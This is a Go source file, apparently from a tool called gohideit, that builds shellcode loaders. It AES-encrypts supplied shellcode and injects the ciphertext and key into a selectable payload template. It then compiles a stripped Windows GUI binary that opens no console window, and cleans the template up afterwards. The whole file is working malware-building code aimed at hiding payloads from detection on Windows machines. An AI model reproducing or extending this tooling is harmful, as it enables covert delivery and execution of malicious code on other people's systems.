package gen

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path"
	"strings"
	"time"

	"github.com/Epictetus24/gohideit/config"
	"github.com/Epictetus24/gohideit/enc"
	"github.com/fatih/color"
	"github.com/manifoldco/promptui"
)

//generates gobin with shellcode
func Generate(outputdir string, xorkey string, aeskey string, shellcode []byte) {

	AESenc := enc.AES256Enc(aeskey, shellcode)

	payloadlist, err := ioutil.ReadDir("./cmd/")
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	var payloadnamelist []string
	for i := range payloadlist {
		payloadnamelist = append(payloadnamelist, payloadlist[i].Name())
	}

	payloadchoice := promptui.Select{
		Label: "Select payload to use",
		Items: payloadnamelist,
	}

	payloadno, _, _ := payloadchoice.Run()

	payloadfile := "cmd/" + payloadnamelist[payloadno] + "/main.go"

	if _, err := os.Stat(payloadfile); os.IsNotExist(err) {
		// path/to/whatever does not exist
		fmt.Println(err)
		os.Exit(1)
	}

	writeandbuild(AESenc, payloadfile, outputdir)

	color.Green("[+] Payload generated, saved at %s.\n", outputdir)

	color.Yellow("[/] Testing Decrypt.\n")
	enc.AES256Dec(AESenc)

}

func writeandbuild(AESencbits enc.AESbits, path string, outputdir string) {

	//fmt.Println(string(read))
	color.Yellow("[/] Replacing strings in %s.\n", path)

	enchexstr := "AESencbits.Enchex = \"" + AESencbits.Enchex + "\""
	salthexstr := "AESencbits.Salthex = \"" + AESencbits.Salthex + "\""
	noncehexstr := "AESencbits.Noncehex = \"" + AESencbits.Noncehex + "\""
	keyhexstr := "AESencbits.Keystr = \"" + AESencbits.Keystr + "\""

	strreplace("AESencbits.Enchex = \"\"", enchexstr, path)
	strreplace("AESencbits.Keystr = \"\"", keyhexstr, path)
	strreplace("AESencbits.Salthex = \"\"", salthexstr, path)
	strreplace("AESencbits.Noncehex = \"\"", noncehexstr, path)

	build(path, outputdir)

	time.Sleep(200)

	color.Yellow("[/] Cleaning up!")
	strreplace(enchexstr, "AESencbits.Enchex = \"\"", path)
	strreplace(keyhexstr, "AESencbits.Keystr = \"\"", path)
	strreplace(salthexstr, "AESencbits.Salthex = \"\"", path)
	strreplace(noncehexstr, "AESencbits.Noncehex = \"\"", path)

}

func strreplace(strtoreplace string, replacementstr string, path string) {

	read, err := ioutil.ReadFile(path)
	if err != nil {
		panic(err)
	}

	replacement := strings.Replace(string(read), strtoreplace, replacementstr, -1)
	err = ioutil.WriteFile(path, []byte(replacement), 0)
	if err != nil {
		panic(err)
	}

}

func build(paypath string, outpath string) {

	command := []string{"build", "-o", outpath, "-trimpath", "-ldflags=\"-w -s -H=windowsgui\"", paypath}

	goBinPath := "/usr/bin/go"
	cmd := exec.Command(goBinPath, command...)

	cmd.Env = []string{
		fmt.Sprintf("CC=%s", config.ReadEnv("CC")),
		fmt.Sprintf("CGO_ENABLED=%s", config.ReadEnv("CGO_ENABLED")),
		fmt.Sprintf("GOOS=%s", "windows"),
		fmt.Sprintf("GOARCH=%s", "amd64"),
		fmt.Sprintf("GOCACHE=%s", config.ReadEnv("GOCACHE")),
		fmt.Sprintf("GOMODCACHE=%s", config.ReadEnv("GOMODCACHE")),
		fmt.Sprintf("GOPRIVATE=%s", ""),
		fmt.Sprintf("PATH=%s:%s", path.Join(config.ReadEnv("GOVERSION"), "bin"), os.Getenv("PATH")),
		fmt.Sprintf("GOPATH=%s", config.ReadEnv("GOPATH")),
	}

	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr

	err := cmd.Run()
	if err != nil {
		color.Red("[!] Bollocks, something went wrong with compiling, soz.\n")
		color.Red(fmt.Sprint(err) + ": " + stderr.String())
		panic(err)

	}

}
